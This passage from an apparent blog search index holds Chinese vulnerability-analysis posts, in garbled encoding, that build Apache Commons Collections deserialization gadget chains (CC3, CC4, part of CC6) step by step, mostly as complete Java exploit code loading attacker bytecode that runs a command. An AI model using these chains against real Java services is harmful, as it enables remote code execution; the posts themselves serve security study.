transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); CC2å°±è¿™æ ·å®Œæˆäº†","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC4é“¾","slug":"JAVAå®‰å…¨CC4é“¾","date":"2024-03-19T03:43:21.919Z","updated":"2024-03-19T09:52:30.841Z","comments":true,"path":"2024/03/19/JAVAå®‰å…¨CC4é“¾/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;19 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€ç»è¿‡å‰å‡ æ¡é“¾å­çš„å­¦ä¹ ç§¯ç´¯ï¼ŒCC4çš„å­¦ä¹ å¯ä»¥è¯´æ˜¯è½»æ¾äº†å¾ˆå¤šã€‚CC4è¿™æ¡é“¾å­å’Œå‰è¾¹çš„ä¸åŒä¹‹å¤„åœ¨äºcommons-collectionsç”±åŸå…ˆçš„å¤§ç‰ˆæœ¬3æ”¹æˆäº†å¤§ç‰ˆæœ¬4ï¼Œä¹Ÿå°±æ˜¯è¯´ä½œç”¨èŒƒå›´ä¸åŒã€‚ æœ¬è´¨ä¸Šæ¥çœ‹ï¼ŒCC4å’Œä¹‹å‰CC3çš„åŒºåˆ«åœ¨äºæ›´æ”¹äº†å‰è¾¹çš„è§¦å‘æ–¹å¼ï¼Œç”±AnnotationInvocationHandlerçš„readObject-&gt;Proxy-&gt;AnnotationInvocationHandlerçš„invoke-&gt;LazyMapçš„get+ä¸€ç³»åˆ—transformå˜ä¸ºäº†PriorityQueueçš„readObject-&gt;PriorityQueueçš„heapify-&gt;PriorityQueueçš„siftDown-&gt;PriorityQueueçš„siftDownUsingComparator-&gt;TransformingComparatorçš„compare+ä¸€ç³»åˆ—transformã€‚å®é™…ä¸Šè¿˜æ˜¯æ¢æ±¤ä¸æ¢è¯ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥æ­£æ–‡ã€‚ æ­£æ–‡å…ˆæ¥çœ‹ä¸€ä¸‹ysoserialä¸­çš„é“¾å­æ„é€ ï¼š çŸ¥é“äº†å¤§è‡´æ€è·¯ï¼Œæˆ‘ä»¬å°±è‡ªå·±æ¥ä»å¤´å†™ä¸€éã€‚ 1.TransformingComparatoréƒ¨åˆ†æ€è·¯å…ˆæ‹ä¸€æ‹ï¼Œæˆ‘ä»¬åœ¨commons-collections4ä¸­ï¼ŒåŸå…ˆçš„CC3é“¾å­åœ¨ChainedTransformerä¹‹åå°±æ–­æ‰äº†ï¼Œå› æ­¤æˆ‘ä»¬è¦æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘transformæ–¹æ³•çš„ç±»ä½œä¸ºLazyMapçš„æ›¿ä»£ï¼Œäºæ˜¯ä¾¿æ‰¾åˆ°äº†TransformingComparatorï¼š å¯è§TransformingComparatorçš„compareæ–¹æ³•è°ƒç”¨äº†transformæ–¹æ³•ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥åªéœ€è¦ç¡®ä¿æ„é€ æ—¶ä¼ å…¥æ„é€ å¥½çš„chainedTransformerå°±å¥½äº†ï¼Œè‡³äºcompareçš„å‚æ•°å¹¶ä¸æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºæˆ‘ä»¬çš„ConstantTransformerå¤ªå¼ºäº†ã€‚ ä¹‹åä¾¿æ˜¯å¯»æ‰¾è°ƒç”¨compareæ–¹æ³•çš„ç±»ï¼Œè¿™é‡ŒCC4ä½œè€…ç›´æ¥ç”¨äº†å†…éƒ¨ç±»ã€‚ 2.PriorityQueueéƒ¨åˆ† å¯è§PriorityQueueçš„siftDownUsingComparatorè°ƒç”¨äº†compareæ–¹æ³•ï¼Œæˆ‘ä»¬å†å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ°äº†PriorityQueueçš„siftDownæ–¹æ³•ï¼š æ¥ç€å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ°PriorityQueueçš„heapifyæ–¹æ³•ï¼š å†å¾€ä¸Šæ‰¾ï¼Œå°±æ‰¾åˆ°äº†PriorityQueueçš„readObjectæ–¹æ³•äº†ï¼š å®é™…ä¸Šï¼Œè¿™æ ·å­å°±åŸºæœ¬ä¸Šå¤§åŠŸå‘Šæˆäº†ï¼Œæˆ‘ä»¬æ¥æ„é€ é“¾å­ã€‚ 3.æ„é€ é“¾3.1 æ‹¼æ¥è‡³äºCC3çš„ååŠéƒ¨åˆ†ï¼Œæˆ‘å°±å…¨æ‹¿è¿‡æ¥äº†ï¼š 12345678910111213141516171819TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); CC3_test.classè¿˜æ˜¯ä¸€æ ·çš„ã€‚ å‰©ä¸‹çš„å…ˆç”¨TransformingComparatoræ¥ä½chainedTransformerï¼š 1TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer); å†ç”¨PriorityQueueæ¥ä½transformingComparatorï¼š 1PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); å—¯ï¼Œæœ€ååºåˆ—åŒ–å’Œååºåˆ—åŒ–å°±åº”è¯¥å¥½äº†ï¼š 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(priorityQueue);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 3.2 é—®é¢˜ç»“æœæ— äº‹å‘ç”Ÿï¼Œè‚¯å®šæ˜¯ä¸­é—´æŸä¸€éƒ¨åˆ†å‡ºé”™äº†ï¼Œæˆ‘ä»¬å°±åœ¨PriorityQueueçš„readObjectæ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹é—®é¢˜æ‰€åœ¨ï¼š å¯ä»¥çœ‹åˆ°è¿™ä¸ªsizeä¸º0ï¼Œä¼ å…¥ä¹‹åä¸ä¼šé€šè¿‡forå¾ªç¯è§¦å‘æ¥ä¸‹æ¥çš„æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦ç»™è¿™ä¸ªæ•°ç»„åŠ ç‚¹å…ƒç´ ï¼Œè®©å®ƒå³ç§»ä¸€ä½ä»æ—§å¤§äº0ï¼Œå¾ˆç®€å•ï¼Œç›´æ¥ä¼ ä¸¤ä¸ªæ•°ï¼Œè®©å®ƒsizeä¸º2å°±è¡Œäº†ï¼š 12priorityQueue.add(1);priorityQueue.add(2); ç»“æœå‘ç°åœ¨åºåˆ—åŒ–ä¹‹å‰å°±å·²ç»å¼¹å‡ºè®¡ç®—å™¨äº†ï¼Œè¯´æ˜å‰è¾¹çš„ä»£ç æœ‰è°ƒç”¨æ•´æ¡é“¾å­çš„æ–¹æ³•ã€‚å®é™…ä¸Šè¿™é‡Œæ˜¯addæ–¹æ³•ï¼Œæˆ‘ä»¬è¿›å»çœ‹ä¸€ä¸‹ï¼š å¯è§è¿™ä¸€å¥—æµç¨‹ä¸‹æ¥ä¹Ÿä¼šè§¦å‘compareæ–¹æ³•ï¼Œæˆ‘ä»¬ä¸æƒ³è®©å®ƒæœ¬åœ°æ‰§è¡Œä¹Ÿå¾ˆç®€å•ï¼Œç›´æ¥åœ¨ç»™transformingComparatorèµ‹å€¼çš„æ—¶å€™éšä¾¿ç»™ä¸€ä¸ªå€¼ï¼Œä¹‹ååœ¨åºåˆ—åŒ–ä¹‹å‰ç»™å®ƒæ”¹å›chainedTransformerå°±å¥½äº†ã€‚ 3.3 å®Œå·¥æœ€ç»ˆå®Œæ•´é“¾å­å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC3é“¾","slug":"JAVAå®‰å…¨CC3é“¾","date":"2024-03-18T06:49:00.261Z","updated":"2024-03-19T02:55:01.427Z","comments":true,"path":"2024/03/18/JAVAå®‰å…¨CC3é“¾/","link":"","permalink":"http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;18 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;18 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€CC3è¿™æ¡é“¾å­å’Œä¹‹å‰çš„å‡ æ¡é“¾å­ä¸å¤ªä¸€æ ·ï¼Œå®ƒæ›´æ”¹äº†å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä¹‹å‰çš„å‡ æ¡é“¾å­éƒ½æ˜¯åå°„è°ƒç”¨Runtime.getRuntime.exec(â€œcalcâ€)æ‰§è¡Œçš„å‘½ä»¤ï¼Œè€ŒCC3åˆ™æ˜¯åˆ©ç”¨çš„åŠ¨æ€ç±»åŠ è½½ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯Javaæ–‡ä»¶æ— æ³•ç›´æ¥è¿è¡Œï¼Œéœ€è¦ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå†é€šè¿‡åŠ è½½å™¨åŠ è½½åˆ°Javaè™šæ‹Ÿæœºçš„å†…å­˜ç©ºé—´ä¸­æ‰èƒ½è¿è¡Œã€‚å…¶æ ¸å¿ƒä¾¿æ˜¯ClassLoaderç±»ï¼Œå…¶ä¸­çš„loadClassâ€“&gt;findClassâ€“&gt;defineClassä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨æ˜¯å¿…é¡»çš„ï¼Œæœ€é‡è¦çš„æ˜¯defineClassæ–¹æ³•ã€‚ è¯´äº†é‚£ä¹ˆå¤šï¼Œä¸å¦‚ç›´æ¥å†™ä¸€ä¸ªä¾‹å­çœ‹ä¸€çœ‹ï¼š å…¶ä¸­ï¼ŒCC3_testä¸­åˆ™æ˜¯ï¼š emmmâ€¦â€¦. äº†è§£äº†è¿™äº›ä¹‹åï¼Œåº”è¯¥å°±å·®ä¸å¤šèƒ½ç†è§£æ•´æ¡CC3é“¾å­äº†ï¼Œæˆ‘ä»¬ç›´æ¥è¿›å…¥æ­£æ–‡ã€‚ æ­£æ–‡å’Œå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ysoserialä¸­é“¾å­çš„è°ƒç”¨æµç¨‹ï¼š å¯è§å…¶ä¸­å¯¹CC1çš„ååŠéƒ¨åˆ†ä¿ç•™å®Œæ•´ï¼Œå¤§è‡´æ˜¯åœ¨LazyMap.getæ–¹æ³•çš„è§¦å‘ä¹‹å‰çš„æµç¨‹ç»™æ”¹äº†ï¼Œæˆ‘ä»¬å°±ä¸€ç‚¹ç‚¹çœ‹å§ã€‚ 1.TemplatesImpléƒ¨åˆ†é¦–å…ˆæˆ‘ä»¬è¦æ‰¾é‡å†™äº†defineClassæ–¹æ³•ä¸”å¯åºåˆ—åŒ–çš„ç±»ï¼Œä¸”å‚æ•°å¯æ§ï¼Œå¾€ä¸Šä¾¿æ‰¾åˆ°äº†TemplatesImpl: ç„¶åå°±æŒ‰æ­£å¸¸æµç¨‹ï¼Œä¸€ç‚¹ç‚¹å¾€ä¸Šæ‰¾å°±å®Œäº†ã€‚ äºæ˜¯ä¾¿æ‰¾åˆ°äº†è°ƒç”¨defineClassæ–¹æ³•çš„åœ°æ–¹ï¼š å…³é”®ä»£ç å°±è¿™ä¹ˆå¤šï¼Œåæ­£å°±æ˜¯defineTransletClassesæ–¹æ³•ä¸­çš„forå¾ªç¯é‡Œè°ƒç”¨äº†ï¼Œä¸”_bytecodeså¯æ§ã€‚ å†å‘ä¸Šæ‰¾ï¼š æ‰¾åˆ°äº†getTransletInstanceæ–¹æ³•ï¼Œå†å‘ä¸Šæ‰¾ä¾¿æ‰¾åˆ°äº†newTransformerï¼š çœ‹åˆ°è¿™é‡Œï¼Œå°±åŸºæœ¬ä¸Šå®Œæˆäº†ï¼Œæˆ‘ä»¬åªéœ€è¦æ³¨æ„ä¸€ä¸‹ä¼ å‚ï¼Œé“¾å­çš„å¤§è‡´å½¢çŠ¶å°±å·®ä¸å¤šç¡®å®šäº†ã€‚ ä¼ å‚éƒ¨åˆ†å‘¢ï¼Œæˆ‘ä»¬ä»å‰å¾€åçœ‹ï¼Œæ­£å¸¸æ¥è¯´çœ‹åˆ°çš„ä¾¿åªéœ€èµ‹å€¼_nameå‚æ•°ï¼Œè®©å®ƒä¸è¦è¿”å›nullï¼Œå¹¶ä¸”_classå‚æ•°ä¸èƒ½ä¼ ï¼Œå› ä¸ºæˆ‘ä»¬è¦çš„å°±æ˜¯defineTransletClassesæ–¹æ³•ï¼Œæœ€å…³é”®çš„_bytecodeå¿…é¡»ä¼ ï¼Œå› ä¸ºæˆ‘ä»¬è¦ç”¨å®ƒæ¥ä½œä¸ºæ‰§è¡Œä»£ç çš„è½½ä½“ã€‚è¿™æ ·ç¼–è¯‘å¥½äº†ä¹‹åä¼šå‘ç°æŠ¥é”™ï¼Œè°ƒè¿›å»ä¸€çœ‹å¯çœ‹åˆ°é—®é¢˜å‡ºåœ¨è°ƒç”¨_factoryå‚æ•°çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè¿™ä¸ªå‚æ•°æˆ‘ä»¬ä¹Ÿè¦ä¼ ã€‚å…ˆçœ‹ä¸€ä¸‹ä»£ç ä¸­å®ƒæœ¬èº«åº”è¯¥æ˜¯ä»€ä¹ˆï¼š æ˜¯TransformerFactoryImplç±»çš„å®ä¾‹ï¼Œé‚£æˆ‘ä»¬å°±ä¼ è¿™ä¸ªã€‚ é‚£ä¹ˆè¿™éƒ¨åˆ†çš„é“¾å­å°±æ„é€ çš„å·®ä¸å¤šäº†ï¼š 1234567891011121314TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());templates.newTransformer(); å¯¹äº†ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ç‚¹è¦æé†’ï¼Œç¼–è¯‘æ‰§è¡Œä»£ç çš„classæ–‡ä»¶çš„javaæ–‡ä»¶éœ€è¦ç»§æ‰¿AbstractTransletè¿™ä¸ªç±»ï¼Œä¸ç„¶å°±ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œç»§æ‰¿ä¹‹åè¿˜è®©å®ç°ä¸€ä¸‹æ¥å£ï¼Œæˆ‘ä»¬å®ç°äº†å°±å¥½äº†ã€‚ javaæ–‡ä»¶å†…å®¹å·®ä¸å¤šæ˜¯è¿™æ ·ï¼š 12345678910111213141516171819public class CC3_test extends AbstractTranslet &#123; static &#123; try&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; å‰©ä¸‹çš„è¯ï¼Œé™¤äº†è¦æ³¨æ„ä¸€ä¸‹è¦æŠŠChainedTransformerçš„å†…å®¹æ”¹ä¸€ä¸‹ï¼Œä½¿å…¶è§¦å‘templatesçš„newTransformeræ–¹æ³•å°±å¥½äº†ã€‚æˆ‘ä»¬å°±ç›´æ¥æŠŠCC1é“¾å­çš„å‰åŠéƒ¨åˆ†æ‹¿è¿‡æ¥ï¼š 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//åå°„è·å–AnnotationInvocationHandlerç±»Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); çœ‹èµ·æ¥ä¸é”™ï¼Œä½†å’Œysoserialä¸­çš„é“¾å­è¿˜æ˜¯æœ‰å·®åˆ«ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å…¶è¿›è¡Œæ›´æ”¹ï¼ŒæŠŠInvokerTransformerç»™ç”¨å…¶ä»–è°ƒç”¨newTransformerçš„ç±»æ›¿ä»£æ‰ï¼Œå› ä¸ºæœ‰çš„jdkç‰ˆæœ¬ä¸­å¯¹InvokerTransformeråšäº†è¿‡æ»¤ã€‚ysoserialä¸­ç”¨çš„æ˜¯TrAXFilterå’ŒInstantiateTransformerã€‚æˆ‘ä»¬ä¸€ä¸ªä¸ªçœ‹ï¼Œå…ˆçœ‹TrAXFilterï¼Œå†çœ‹InstantiateTransformerã€‚ 2.ChainedTransformeréƒ¨åˆ†2.1 TrAXFilteréƒ¨åˆ† å¯è§å…¶æ„é€ å™¨ï¼Œæˆ‘ä»¬ç›´æ¥ä¼ å…¥templateså¯¹è±¡ä¾¿å¯è°ƒç”¨å…¶newTransformeræ–¹æ³•ï¼Œåªæ˜¯å¯æƒœTrAXFilteræ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œåªèƒ½ç”¨TrAXFilteré…åˆåå°„æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œäºæ˜¯ä¾¿æœ‰äº†InstantiateTransformerã€‚ 2.2 InstantiateTransformeréƒ¨åˆ† å…³é”®ä»£ç å°±è¿™äº›ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠTrAXFilter.classä½œä¸ºinputå‚æ•°ä¼ è¿›å»å°±å¥½äº†ï¼Œè‡³äºparamTypesæˆ‘ä»¬å¯ä»¥ä¼ ä¸€ä¸ªnew Class[]{Templates.class}ï¼Œè€Œå‚æ•°å°±ç›´æ¥ä¼ æ„é€ å¥½çš„templatesï¼ŒæŠŠé“¾å­æ„é€ èµ·æ¥å°±æ˜¯å¦‚ä¸‹æ¨¡æ ·ï¼š 12345Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); 3.æ„é€ é“¾æˆ‘ä»¬ç›´æ¥æŠŠChainedTransformeréƒ¨åˆ†çš„ä¿®æ”¹ç»™æ·»ä¸Šå»å°±å¥½äº†ï¼š 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//åå°„è·å–AnnotationInvocationHandlerç±»Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//åºåˆ—åŒ–ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//ååºåˆ—åŒ–ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); è¿™æ ·ä¸€æ¥ï¼ŒCC3ä¹Ÿä¾¿å¤§åŠŸå‘Šæˆäº†ã€‚","categories":[],"tags":[]},{"title":"JAVAå®‰å…¨:CC6é“¾","slug":"JAVAå®‰å…¨CC6é“¾","date":"2024-03-17T11:28:41.733Z","updated":"2024-08-24T03:24:40.522Z","comments":true,"path":"2024/03/17/JAVAå®‰å…¨CC6é“¾/","link":"","permalink":"http://example.com/2024/03/17/JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;17 åˆ†ç±»ï¼šVulnerability Analysis","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;3&#x2F;17 åˆ†ç±»ï¼šVulnerability Analysis å‰è¨€CC6è¿™æ¡é“¾ä¸å—jdkç‰ˆæœ¬é™åˆ¶ï¼Œå¯è°“éå¸¸å¥½ç”¨ã€‚å½“åˆæˆ‘æ¥è§¦åˆ°çš„ç¬¬ä¸€ä¸ªJavaååºåˆ—åŒ–çš„é¢˜å°±æ˜¯ç”¨CC6è§£å†³çš„ï¼Œå°è±¡ååˆ†æ·±åˆ»ã€‚ ä¹‹å‰æˆ‘ä»¬å­¦ä¹ äº†URLDNSè¿™æ¡é“¾ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸ºäº†CC6åšå‡†å¤‡ï¼Œå› ä¸ºäºŒè€…æœ‰ä¸€äº›å¼‚æ›²åŒå·¥ä¹‹å¦™ã€‚ æ­£æ–‡æˆ‘ä»¬å…ˆå’Œå¾€å¸¸ä¸€æ ·ï¼Œå»çœ‹ä¸€ä¸‹ysoserialä¸­çš„CC6çš„æµç¨‹ï¼š å¯ä»¥å‘ç°è¿™æ¡é“¾çš„ååŠéƒ¨åˆ†å’Œæˆ‘ä»¬çš„CC1è¿™æ¡é“¾çš„ååŠéƒ¨åˆ†ä¸€æ¨¡ä¸€æ ·ï¼Œå‰è¾¹åˆ™æ˜¯ç”±AnnotationInvocationHandlerçš„invokeæ–¹æ³•è§¦å‘getæ–¹æ³•ä¿®æ”¹æˆäº†TiedMapEntryç±»ä¸­çš„æ–¹æ³•æ¥è§¦å‘ã€‚æˆ‘ä»¬æ¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ã€‚ 1.TiedMapEntryéƒ¨åˆ†é¦–å…ˆï¼Œå‰è¾¹ä¸€æ¨¡ä¸€æ ·ï¼Œæˆ‘å°±ç›´æ¥copyè¿‡æ¥äº†ï¼Œç›´æ¥ä»TiedMapEntryçš„getValue()æ–¹æ³•æ¥çœ‹ã€‚ å®é™…ä¸Šå®ƒçš„getValueä¸­è°ƒç”¨äº†mapçš„getæ–¹æ³•ï¼Œè€Œmapæ˜¯å¯æ§çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥æ„é€ 